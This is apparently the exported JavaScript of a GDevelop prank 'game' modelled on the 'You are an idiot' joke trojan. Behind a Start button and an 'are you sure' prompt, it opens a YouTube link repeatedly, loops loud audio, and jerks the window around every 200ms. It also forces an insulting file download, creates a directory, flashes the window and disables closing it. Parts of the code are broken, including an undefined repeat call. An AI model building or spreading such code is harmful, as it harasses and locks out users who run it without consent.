gdjs.gameCode = {};
gdjs.gameCode.localVariables = [];
gdjs.gameCode.GDStartButtonObjects1= [];
gdjs.gameCode.GDStartButtonObjects2= [];
gdjs.gameCode.GDStartButtonObjects3= [];
gdjs.gameCode.GDare_9595you_9595sureObjects1= [];
gdjs.gameCode.GDare_9595you_9595sureObjects2= [];
gdjs.gameCode.GDare_9595you_9595sureObjects3= [];
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1= [];
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects2= [];
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects3= [];


gdjs.gameCode.mapOfGDgdjs_9546gameCode_9546GDStartButtonObjects1Objects = Hashtable.newFrom({"StartButton": gdjs.gameCode.GDStartButtonObjects1});
gdjs.gameCode.mapOfGDgdjs_9546gameCode_9546GDare_95959595you_95959595sureObjects1Objects = Hashtable.newFrom({"are_you_sure": gdjs.gameCode.GDare_9595you_9595sureObjects1});
gdjs.gameCode.userFunc0x86edf8 = function GDJSInlineCode(runtimeScene) {
"use strict";
let moveInterval;
let x = 0, y = 0;

// Function to move the window
function moveWindow() {
    // Calculate random movement
    x += Math.random() * 200 - 100; // Random x movement (-100 to 100)
    y += Math.random() * 200 - 100; // Random y movement (-100 to 100)

    // Get screen dimensions and window size
    const screenWidth = screen.availWidth;
    const screenHeight = screen.availHeight;
    const windowWidth = window.outerWidth;
    const windowHeight = window.outerHeight;

    // Ensure the window stays within screen bounds
    if (x < 0) x = 0;
    if (x > screenWidth - windowWidth) x = screenWidth - windowWidth;
    if (y < 0) y = 0;
    if (y > screenHeight - windowHeight) y = screenHeight - windowHeight;

    // Move the window
    window.moveTo(x, y);
}

// Start moving the window
function startMoving() {
    moveInterval = setInterval(moveWindow, 200); // Move every 200ms
}

// Stop moving the window
function stopMoving() {
    clearInterval(moveInterval);
}

// Automatically start the movement
startMoving();
};
gdjs.gameCode.userFunc0x84c4e0 = function GDJSInlineCode(runtimeScene) {
"use strict";
// Create a blob object with some text content
var blob = new Blob ( ["you are idot hahahaha!"], {type: "text/plain;charset=utf-8"} );
// Create a temporary URL for the blob object
var url = URL.createObjectURL (blob);
// Create an anchor element and set its href and download attributes
var a = document.createElement ("a");
a.href = url;
a.download = "you are idiot hahahahaha.txt";
// Append the anchor element to the document body and click it
document.body.appendChild (a);
a.click ();
// Remove the anchor element and revoke the URL
document.body.removeChild (a);
URL.revokeObjectURL (url);
repeat(999999999)

};
gdjs.gameCode.eventsList0 = function(runtimeScene) {

{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.window.openURL("https://youtu.be/b2pD0B9Rfps", runtimeScene);
}}

}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.sound.playMusic(runtimeScene, "assets/yt1s.com - You are an idiot HAHAHAHAHA_320kbps.mp3", true, 100, 1);
}}

}


{


let isConditionTrue_0 = false;
{
{gdjs.fileSystem.makeDirectory("/test", gdjs.VariablesContainer.badVariable);
}}

}


{


gdjs.gameCode.userFunc0x86edf8(runtimeScene);

}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.window.openURL("https://youtu.be/b2pD0B9Rfps", runtimeScene);
}}

}


{



}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.window.openURL("https://youtu.be/b2pD0B9Rfps", runtimeScene);
}}

}


{


gdjs.gameCode.userFunc0x84c4e0(runtimeScene);

}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.window.openURL("https://youtu.be/b2pD0B9Rfps", runtimeScene);
}}

}


{



}


{


let isConditionTrue_0 = false;
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.advancedWindow.isResizable(runtimeScene);
if (isConditionTrue_0) {
{gdjs.evtTools.advancedWindow.setPosition(gdjs.evtTools.input.getCursorX(runtimeScene, "", 0), gdjs.evtTools.input.getCursorY(runtimeScene, "", 0), runtimeScene);
}{gdjs.evtTools.advancedWindow.setMaximizable(false, runtimeScene);
}{gdjs.evtTools.advancedWindow.setPosition(gdjs.evtTools.advancedWindow.getPositionX(runtimeScene), gdjs.evtTools.advancedWindow.getPositionX(runtimeScene), runtimeScene);
}}

}


{



}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.advancedWindow.flash(true, runtimeScene);
}}

}


{


let isConditionTrue_0 = false;
{
{gdjs.evtTools.advancedWindow.setClosable(false, runtimeScene);
}}

}


};gdjs.gameCode.eventsList1 = function(runtimeScene) {

{


let isConditionTrue_0 = false;
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.runtimeScene.sceneJustBegins(runtimeScene);
if (isConditionTrue_0) {
gdjs.copyArray(runtimeScene.getObjects("are_you_sure"), gdjs.gameCode.GDare_9595you_9595sureObjects1);
gdjs.copyArray(runtimeScene.getObjects("you_are_an_idiot"), gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1);
{for(var i = 0, len = gdjs.gameCode.GDare_9595you_9595sureObjects1.length ;i < len;++i) {
    gdjs.gameCode.GDare_9595you_9595sureObjects1[i].hide();
}
}{for(var i = 0, len = gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1.length ;i < len;++i) {
    gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1[i].hide();
}
}}

}


{

gdjs.copyArray(runtimeScene.getObjects("StartButton"), gdjs.gameCode.GDStartButtonObjects1);

let isConditionTrue_0 = false;
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.input.cursorOnObject(gdjs.gameCode.mapOfGDgdjs_9546gameCode_9546GDStartButtonObjects1Objects, runtimeScene, true, false);
if (isConditionTrue_0) {
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.input.isMouseButtonReleased(runtimeScene, "Left");
}
if (isConditionTrue_0) {
gdjs.copyArray(runtimeScene.getObjects("are_you_sure"), gdjs.gameCode.GDare_9595you_9595sureObjects1);
{for(var i = 0, len = gdjs.gameCode.GDare_9595you_9595sureObjects1.length ;i < len;++i) {
    gdjs.gameCode.GDare_9595you_9595sureObjects1[i].hide(false);
}
}}

}


{

gdjs.copyArray(runtimeScene.getObjects("are_you_sure"), gdjs.gameCode.GDare_9595you_9595sureObjects1);

let isConditionTrue_0 = false;
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.input.cursorOnObject(gdjs.gameCode.mapOfGDgdjs_9546gameCode_9546GDare_95959595you_95959595sureObjects1Objects, runtimeScene, true, false);
if (isConditionTrue_0) {
isConditionTrue_0 = false;
isConditionTrue_0 = gdjs.evtTools.input.isMouseButtonReleased(runtimeScene, "Left");
}
if (isConditionTrue_0) {
gdjs.copyArray(runtimeScene.getObjects("you_are_an_idiot"), gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1);
{gdjs.evtTools.window.setWindowTitle(runtimeScene, "you are idiot");
}{for(var i = 0, len = gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1.length ;i < len;++i) {
    gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1[i].hide(false);
}
}
{ //Subevents
gdjs.gameCode.eventsList0(runtimeScene);} //End of subevents
}

}


};

gdjs.gameCode.func = function(runtimeScene) {
runtimeScene.getOnceTriggers().startNewFrame();

gdjs.gameCode.GDStartButtonObjects1.length = 0;
gdjs.gameCode.GDStartButtonObjects2.length = 0;
gdjs.gameCode.GDStartButtonObjects3.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects1.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects2.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects3.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects2.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects3.length = 0;

gdjs.gameCode.eventsList1(runtimeScene);
gdjs.gameCode.GDStartButtonObjects1.length = 0;
gdjs.gameCode.GDStartButtonObjects2.length = 0;
gdjs.gameCode.GDStartButtonObjects3.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects1.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects2.length = 0;
gdjs.gameCode.GDare_9595you_9595sureObjects3.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects1.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects2.length = 0;
gdjs.gameCode.GDyou_9595are_9595an_9595idiotObjects3.length = 0;


return;

}

gdjs['gameCode'] = gdjs.gameCode;
